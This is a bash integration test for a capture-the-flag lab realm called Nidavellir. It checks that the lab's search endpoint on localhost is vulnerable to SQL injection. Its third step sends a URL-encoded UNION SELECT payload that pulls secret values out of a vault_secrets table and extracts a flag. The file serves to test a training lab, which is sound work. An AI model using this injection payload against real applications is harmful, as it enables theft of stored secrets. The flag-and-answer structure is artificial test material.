#!/bin/bash
# Integration test for Nidavellir - SQL Injection

set -e

REALM="nidavellir"
BASE_URL="http://localhost:8080/realms/${REALM}"

echo "========================================"
echo "Testing NIDAVELLIR Realm"
echo "A05:2025 - SQL Injection"
echo "========================================"
echo ""

echo "Step 1: Health check..."
curl -s "${BASE_URL}/health" | grep -q '"status":"ok"' && echo "✓ Health OK" || exit 1

echo "Step 2: Normal search..."
curl -s "${BASE_URL}/api/search?q=North" | grep -q '"success":true' && echo "✓ Normal search works" || exit 1

echo "Step 3: SQL Injection - Extract flag..."
RESPONSE=$(curl -s "${BASE_URL}/api/search?q=%27%20UNION%20SELECT%20secret_id%2C%20secret_type%2C%20secret_value%2C%200%2C%20null%2C%20null%20FROM%20vault_secrets--")

FLAG=$(echo "$RESPONSE" | grep -oP 'YGGDRASIL\{NIDAVELLIR:[a-f0-9-]+\}' | head -1)

if [ -z "$FLAG" ]; then
  echo "✗ Flag not found"
  exit 1
fi

echo "✓ Flag extracted: $FLAG"

echo "$FLAG" | grep -qP '^YGGDRASIL\{NIDAVELLIR:[a-f0-9-]+\}$' && echo "✓ Flag format valid" || exit 1

echo ""
echo "========================================"
echo "✓ All NIDAVELLIR tests passed!"
echo "========================================"
echo "Flag: $FLAG"
